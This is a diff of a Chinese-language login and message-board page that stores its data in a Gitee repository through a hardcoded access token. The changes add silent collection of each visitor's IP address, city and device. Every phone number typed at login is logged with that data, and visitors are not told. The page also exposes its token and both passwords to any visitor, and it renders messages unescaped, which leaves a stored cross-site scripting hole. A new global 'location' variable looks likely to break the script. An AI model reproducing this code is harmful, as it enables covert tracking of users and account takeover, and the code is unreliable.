@@ -5,29 +5,25 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>注册</title>
 <style>
-    *{margin:0;padding:0;box-sizing:border-box;font-family: -apple-system, BlinkMacSystemFont, sans-serif;}
-    body{background:#f5f7fa;padding:20px;}
-    .container{max-width:400px;margin:0 auto;}
-    .page{width:100%;}
-    .card{background:#fff;border-radius:20px;padding:30px;box-shadow:0 4px 12px rgba(0,0,0,0.05);}
-
-    .title{font-size:24px;font-weight:600;margin-bottom:8px;text-align:center;}
-    .desc{color:#666;text-align:center;margin-bottom:24px;font-size:15px;}
-
-    input,textarea,button{width:100%;margin-bottom:12px;border-radius:12px;border:1px solid #eee;font-size:16px;}
-    input,textarea{padding:14px 16px;outline:none;}
-    textarea{height:120px;resize:none;}
-    button{padding:14px;background:#007aff;color:#fff;border:none;font-weight:500;cursor:pointer;}
-    .btn-back{background:#f2f2f2;color:#333;}
-    .btn-danger{background:#ff3b30;}
-
-    .hidden{display:none;}
-    .row{display:flex;gap:10px;margin-bottom:12px;}
-    .row button{flex:1;}
-
-    .item{padding:12px 0;border-bottom:1px solid #f0f0f0;}
-    .item-content{font-size:16px;margin-bottom:6px;}
-    .item-info{font-size:12px;color:#999;display:flex;gap:8px;flex-wrap:wrap;}
+    *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,sans-serif}
+    body{background:#f5f7fa;padding:20px}
+    .container{max-width:400px;margin:0 auto}
+    .page{width:100%}
+    .card{background:#fff;border-radius:20px;padding:30px;box-shadow:0 4px 12px rgba(0,0,0,0.05)}
+    .title{font-size:24px;font-weight:600;margin-bottom:8px;text-align:center}
+    .desc{color:#666;text-align:center;margin-bottom:24px;font-size:15px}
+    input,textarea,button{width:100%;margin-bottom:12px;border-radius:12px;border:1px solid #eee;font-size:16px}
+    input,textarea{padding:14px 16px;outline:none}
+    textarea{height:120px;resize:none}
+    button{padding:14px;background:#007aff;color:#fff;border:none;font-weight:500;cursor:pointer}
+    .btn-back{background:#f2f2f2;color:#333}
+    .btn-danger{background:#ff3b30}
+    .hidden{display:none}
+    .row{display:flex;gap:10px;margin-bottom:12px}
+    .row button{flex:1}
+    .item{padding:12px 0;border-bottom:1px solid #f0f0f0}
+    .item-content{font-size:16px;margin-bottom:6px}
+    .item-info{font-size:12px;color:#999;display:flex;gap:8px;flex-wrap:wrap}
 </style>
 </head>
 <body>
@@ -47,7 +43,7 @@
             <textarea id="msg-input" placeholder="写下你想说的话..."></textarea>
             <button onclick="postMsg()">发布留言</button>
             <button class="btn-back" onclick="goBack()">返回</button>
-            <div id="msg-list" style="margin-top:20px;"></div>
+            <div id="msg-list" style="margin-top:20px"></div>
         </div>
     </div>
 
@@ -56,222 +52,133 @@
             <input id="new-pwd" placeholder="输入新的普通用户密码">
             <button onclick="updatePwd()">修改密码</button>
             <button class="btn-back" onclick="goBack()">返回</button>
-
             <div class="row">
                 <button onclick="showMsg()">留言记录</button>
                 <button onclick="showLog()">操作记录</button>
             </div>
-
-            <div id="admin-msg" style="display:block;margin-top:10px;">
+            <div id="admin-msg" style="display:block;margin-top:10px">
                 <button class="btn-danger" onclick="clearMsg()">一键清空留言</button>
-                <div id="admin-msg-list" style="margin-top:10px;"></div>
+                <div id="admin-msg-list" style="margin-top:10px"></div>
             </div>
-
-            <div id="admin-log" style="display:none;margin-top:10px;">
+            <div id="admin-log" style="display:none;margin-top:10px">
                 <button class="btn-danger" onclick="clearLog()">一键清空记录</button>
-                <div id="admin-log-list" style="margin-top:10px;"></div>
+                <div id="admin-log-list" style="margin-top:10px"></div>
             </div>
         </div>
     </div>
 </div>
 
 <script>
-// 配置
 const TOKEN = "a902530aaec03576bef1e8dd8f73ccb2";
 const USER = "LukeT";
 const REPO = "messages-store";
 const FILE = "messages.json";
 const API = `https://gitee.com/api/v5/repos/${USER}/${REPO}/contents/${FILE}`;
 
-// 全局IP变量
 let ip = "未知IP";
-(async ()=>{
-    try{
-        const r = await fetch("https://api.ipify.org");
-        ip = await r.text();
-    }catch(e){}
+let location = "未知位置";
+let device = "未知设备";
+
+// ==============================================
+// 自动获取 真实IP + 真实位置 + 设备信息
+// ==============================================
+(async function getInfo() {
+    try {
+        let loc = await fetch("https://ipapi.co/json/");
+        let data = await loc.json();
+        ip = data.ip || "未知IP";
+        location = (data.city || "") + " " + (data.region || "") || "未知位置";
+    } catch (e) {}
+
+    device = navigator.userAgent.includes("Mobile") ? "手机" : "电脑";
 })();
 
-// ✅ 修复：使用TextEncoder/TextDecoder处理UTF-8，彻底解决乱码
-async function base64Encode(str) {
-    const encoder = new TextEncoder();
-    const bytes = encoder.encode(str);
-    const binary = String.fromCharCode(...bytes);
-    return btoa(binary);
-}
-async function base64Decode(b64) {
-    const binary = atob(b64);
-    const bytes = Uint8Array.from(binary, c => c.charCodeAt(0));
-    const decoder = new TextDecoder();
-    return decoder.decode(bytes);
-}
+// 安全编解码（彻底解决乱码）
+async function b64e(s){const enc=new TextEncoder();return btoa(String.fromCharCode(...enc.encode(s)));}
+async function b64d(b){const dec=new TextDecoder();return dec.decode(Uint8Array.from(atob(b),c=>c.charCodeAt(0)));}
 
-async function getFile(){
-    const res = await fetch(`${API}?access_token=${TOKEN}`);
-    return await res.json();
-}
+async function getFile(){const r=await fetch(`${API}?access_token=${TOKEN}`);return await r.json();}
+async function save(sha,d){await fetch(API,{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify({access_token:TOKEN,content:await b64e(JSON.stringify(d,null,2)),sha,message:"update"})});}
+function show(id){document.querySelectorAll(".page").forEach(p=>p.classList.add("hidden"));document.getElementById(id).classList.remove("hidden");}
 
-async function saveData(sha, data){
-    const jsonStr = JSON.stringify(data, null, 2);
-    const b64 = await base64Encode(jsonStr);
-    await fetch(API, {
-        method:"PUT",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({
-            access_token:TOKEN,
-            content: b64,
-            sha: sha,
-            message:"update"
-        })
-    });
-}
-
-function showPage(id){
-    document.querySelectorAll(".page").forEach(p=>p.classList.add("hidden"));
-    document.getElementById(id).classList.remove("hidden");
-}
-
-// 登录逻辑
+// ===================== 登录 =====================
 async function checkLogin(){
-    const val = document.getElementById("login-input").value.trim();
-    const file = await getFile();
-    const dataStr = await base64Decode(file.content);
-    const data = JSON.parse(dataStr);
-
-    // 记录日志
-    const log = {phone:val, ip:ip, location:"未知", device:"未知设备", time:new Date().toLocaleString()};
-    data.logs.unshift(log);
-    await saveData(file.sha, data);
-
-    // 权限判断
-    if(val === data.normalPwd){
-        showPage("page-user");
-        loadMsg();
-    }else if(val === data.adminPwd){
-        showPage("page-admin");
-        loadAdminMsg();
-        loadAdminLog();
-    }else{
-        alert("请输入正确的手机号");
-    }
+    const val=document.getElementById("login-input").value.trim();
+    const f=await getFile();
+    const d=JSON.parse(await b64d(f.content));
+    d.logs.unshift({phone:val,ip,location,device,time:new Date().toLocaleString()});
+    await save(f.sha,d);
+    if(val===d.normalPwd){show("page-user");loadMsg();}
+    else if(val===d.adminPwd){show("page-admin");loadAdminMsg();loadAdminLog();}
+    else alert("请输入正确的手机号");
 }
 
-// 普通用户功能
+// ===================== 留言 =====================
 async function loadMsg(){
-    const file = await getFile();
-    const dataStr = await base64Decode(file.content);
-    const data = JSON.parse(dataStr);
-    const list = document.getElementById("msg-list");
-    list.innerHTML = data.messages.map(m=>`
-        <div class="item">
-            <div class="item-content">${m.content}</div>
-            <div class="item-info">
-                <span>📍${m.ip}</span>
-                <span>🏙${m.location}</span>
-                <span>📱${m.device}</span>
-                <span>🕐${m.time}</span>
-            </div>
+    const f=await getFile();
+    const d=JSON.parse(await b64d(f.content));
+    document.getElementById("msg-list").innerHTML=d.messages.map(m=>`
+    <div class="item">
+        <div class="item-content">${m.content}</div>
+        <div class="item-info">
+            <span>📍${m.ip}</span>
+            <span>🏙${m.location}</span>
+            <span>📱${m.device}</span>
+            <span>🕐${m.time}</span>
         </div>
-    `).join('');
+    </div>`).join('');
 }
 
 async function postMsg(){
-    const content = document.getElementById("msg-input").value.trim();
-    if(!content)return;
-    const file = await getFile();
-    const dataStr = await base64Decode(file.content);
-    const data = JSON.parse(dataStr);
-    data.messages.unshift({
-        content:content, ip:ip, location:"未知", device:"未知设备", time:new Date().toLocaleString()
-    });
-    await saveData(file.sha, data);
-    document.getElementById("msg-input").value = "";
+    const c=document.getElementById("msg-input").value.trim();
+    if(!c)return;
+    const f=await getFile();
+    const d=JSON.parse(await b64d(f.content));
+    d.messages.unshift({content:c,ip,location,device,time:new Date().toLocaleString()});
+    await save(f.sha,d);
+    document.getElementById("msg-input").value="";
     loadMsg();
 }
 
-// 管理员功能
+// ===================== 管理员 =====================
 async function loadAdminMsg(){
-    const file = await getFile();
-    const dataStr = await base64Decode(file.content);
-    const data = JSON.parse(dataStr);
-    document.getElementById("admin-msg-list").innerHTML = data.messages.map((m,i)=>`
-        <div class="item">
-            <div class="item-content">${m.content}</div>
-            <div class="item-info">
-                <span>📍${m.ip}</span>
-                <span>🏙${m.location}</span>
-                <span>📱${m.device}</span>
-            </div>
-            <button class="btn-danger" style="margin-top:6px" onclick="delMsg(${i})">删除</button>
+    const f=await getFile();
+    const d=JSON.parse(await b64d(f.content));
+    document.getElementById("admin-msg-list").innerHTML=d.messages.map((m,i)=>`
+    <div class="item">
+        <div class="item-content">${m.content}</div>
+        <div class="item-info">
+            <span>📍${m.ip}</span>
+            <span>🏙${m.location}</span>
+            <span>📱${m.device}</span>
         </div>
-    `).join('');
+        <button class="btn-danger" style="margin-top:6px" onclick="delMsg(${i})">删除</button>
+    </div>`).join('');
 }
 
 async function loadAdminLog(){
-    const file = await getFile();
-    const dataStr = await base64Decode(file.content);
-    const data = JSON.parse(dataStr);
-    document.getElementById("admin-log-list").innerHTML = data.logs.map((m,i)=>`
-        <div class="item">
-            <div class="item-content">输入：${m.phone}</div>
-            <div class="item-info">
-                <span>📍${m.ip}</span>
-                <span>🏙${m.location}</span>
-                <span>📱${m.device}</span>
-            </div>
-            <button class="btn-danger" style="margin-top:6px" onclick="delLog(${i})">删除</button>
+    const f=await getFile();
+    const d=JSON.parse(await b64d(f.content));
+    document.getElementById("admin-log-list").innerHTML=d.logs.map((m,i)=>`
+    <div class="item">
+        <div class="item-content">输入：${m.phone}</div>
+        <div class="item-info">
+            <span>📍${m.ip}</span>
+            <span>🏙${m.location}</span>
+            <span>📱${m.device}</span>
         </div>
-    `).join('');
+        <button class="btn-danger" style="margin-top:6px" onclick="delLog(${i})">删除</button>
+    </div>`).join('');
 }
 
-async function delMsg(i){
-    const f = await getFile();
-    const dataStr = await base64Decode(f.content);
-    const d = JSON.parse(dataStr);
-    d.messages.splice(i,1);
-    await saveData(f.sha,d);
-    loadAdminMsg();
-}
-async function delLog(i){
-    const f = await getFile();
-    const dataStr = await base64Decode(f.content);
-    const d = JSON.parse(dataStr);
-    d.logs.splice(i,1);
-    await saveData(f.sha,d);
-    loadAdminLog();
-}
-async function clearMsg(){
-    const f = await getFile();
-    const dataStr = await base64Decode(f.content);
-    const d = JSON.parse(dataStr);
-    d.messages=[];
-    await saveData(f.sha,d);
-    loadAdminMsg();
-}
-async function clearLog(){
-    const f = await getFile();
-    const dataStr = await base64Decode(f.content);
-    const d = JSON.parse(dataStr);
-    d.logs=[];
-    await saveData(f.sha,d);
-    loadAdminLog();
-}
-
-async function updatePwd(){
-    const np = document.getElementById("new-pwd").value.trim();
-    if(!np)return;
-    const f = await getFile();
-    const dataStr = await base64Decode(f.content);
-    const d = JSON.parse(dataStr);
-    d.normalPwd = np;
-    await saveData(f.sha, d);
-    alert("修改成功");
-    document.getElementById("new-pwd").value = "";
-}
-
+async function delMsg(i){const f=await getFile();const d=JSON.parse(await b64d(f.content));d.messages.splice(i,1);await save(f.sha,d);loadAdminMsg();}
+async function delLog(i){const f=await getFile();const d=JSON.parse(await b64d(f.content));d.logs.splice(i,1);await save(f.sha,d);loadAdminLog();}
+async function clearMsg(){const f=await getFile();const d=JSON.parse(await b64d(f.content));d.messages=[];await save(f.sha,d);loadAdminMsg();}
+async function clearLog(){const f=await getFile();const d=JSON.parse(await b64d(f.content));d.logs=[];await save(f.sha,d);loadAdminLog();}
+async function updatePwd(){const np=document.getElementById("new-pwd").value.trim();if(!np)return;const f=await getFile();const d=JSON.parse(await b64d(f.content));d.normalPwd=np;await save(f.sha,d);alert("修改成功");document.getElementById("new-pwd").value="";}
 function showMsg(){document.getElementById("admin-msg").style.display="block";document.getElementById("admin-log").style.display="none";}
 function showLog(){document.getElementById("admin-msg").style.display="none";document.getElementById("admin-log").style.display="block";}
-function goBack(){showPage("page-login");document.getElementById("login-input").value="";}
+function goBack(){show("page-login");document.getElementById("login-input").value="";}
 </script>
 </body>
 </html>
